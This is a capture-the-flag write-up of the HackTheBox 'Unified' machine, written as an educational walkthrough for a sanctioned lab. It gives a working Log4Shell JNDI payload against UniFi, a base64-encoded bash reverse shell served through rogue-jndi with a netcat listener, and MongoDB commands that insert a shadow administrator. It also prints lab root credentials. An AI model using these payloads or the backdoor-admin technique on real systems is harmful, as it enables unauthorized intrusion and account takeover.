---
title: "HackTheBox - Unified"
author: Nasrallah
description: ""
date: 2022-07-13 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, log4j, burpsuite, mongodb]
img_path: /assets/img/hackthebox/machines/unified/
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Unified](https://app.hackthebox.com/starting-point?tier=2) from [HackTheBox](https://www.hackthebox.com). The target is running Unifi Network with a version vulnerable to log4j, we use that to get a reverse shell. The application(Unifi) is using Mongodb without authentication, so we add a shadow admin to login to the application as administrator, and there we find some ssh credentials.

## Enumeration

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.96.149                                             
Host is up (1.5s latency).                                                     
Not shown: 996 closed tcp ports (reset)                                   
PORT     STATE    SERVICE         VERSION                                 
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)            
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)                                                                                               
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)                                                                                             
6789/tcp open  ibm-db2-admin?                                                  
8080/tcp open  http-proxy
| fingerprint-strings:                                                         
|   FourOhFourRequest:                                                         
|     HTTP/1.1 404                                                             
|     Content-Type: text/html;charset=utf-8                                                                                                                   
|     Content-Language: en                                                                                                                                    
|     Content-Length: 431                                                      
|     Date: Mon, 01 Aug 2022 20:55:52 GMT                                 
|     Connection: close 
< **SNIP**>
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24 
|_Not valid after:  2024-04-03T21:37:24
```

We see 4 open ports, ssh on 22 http on port 8080 and some other things.

### Web

Let's go to the webpage on port 8080.

![](1.png)

We get redirected to Unifi login page version 6.4.54. Let's google that version number and see if there is any vulnerabilities.

![](2.png)

We see that this version is vulnerable to the famous `log4j` with the CVE number `CVE-2021-44228`.

Found this [Article](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) that would be our guide to exploit this vulnerability and get a reverse shell.

First, let's intercept a login request using burp and send it to repeater.

![](4.png)

We see 4 keys in this post request, username, password, rememberme and strict.

According to the article, the vulnerability is in the `rememberme` value issued in the login request.

![](3.png)

We can see where our payload would go.

To test the vulnerability, we can use `tcpdump` to listen for connection on port 1389 in the `tun0` interface which is our vpn connection. `sudo tcpdump -i tun0 port 1389`

The payload we will use is this one: `${jndi:ldap://10.10.16.10:1389/o=tomcat}`, put it in the rememberme value.

![](5.png)

Now send the request and you should see show in `tcpdump`.

![](6.png)

## Foothold

Now that we know the target is vulnerable, we're going to proceed to get a reverse shell.

First, we need to clone this [Github repository](https://github.com/veracode-research/rogue-jndi) and build the tool.

```bash
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
```

Once completed, we are going to need a payload that would sends us a reverse shell, the one we'll use is this `bash -c bash -i >&/dev/tcp/10.10.10.10/4444 0>&1`.

Now we need the base64 encode the payload with this command `echo 'bash -c bash -i >&/dev/tcp/10.10.10.10/4444 0>&1' | base64`

Now we need to start the rogue-jndi LDAP server with the following command.

```bash
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTAvNDQ0NCAwPiYxCg}|{base64,-d}|{bash,-i}" --hostname "10.10.10.10"
```

>Replace the Base64 encoded string after “echo” in the command above with the one you generated. Replace the hostname variable with you IP

![](7.png)

Now setup a netcat listener `nc -lvnp 4444`

To get the reverse shell, go back to burp suite and send the same request as before.

![](9.png)

Back to the listener we see that we got a shell.

![](8.png)

For a better shell, execute the following commands 

```bash
script /dev/null -c bash
export TERM=xterm
"ctrl + x"
stty raw -echo;fg
```


## Privilege Escalation

According to the [article](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi), there is a MongoDB instance storing application information listening on localhost without authentication.

We can dump a JSON array of users and their password hashes using this command : `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`

![](10.png)

Cracking the hash might take time so we're going to add our an admin user to the database.

First, we need to generate a sha-512 hash with the following command: `mkpasswd -m sha-512 pass123`

![](11.png)

Then we add our shadow admin with this command:

```bash
mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "time_created" : NumberLong(100019800), "x_shadow" : "<PASSWORD-HASH>" })'
```

![](12.png)

Now we run this command to check if our admin has been added. `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`

![](13.png)

Yes, it's there. Now let's go back to Unifi login page and sign in using the credentials we just registered, in my case: `unifi-admin:pass123`

![](14.png)

From this point, things haven't been working smoothly with me. According to the official walkthrough, we should go to settings -> Site and find the following ssh credentials. `root:NotACrackablePassword4U2022`.

![](15.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
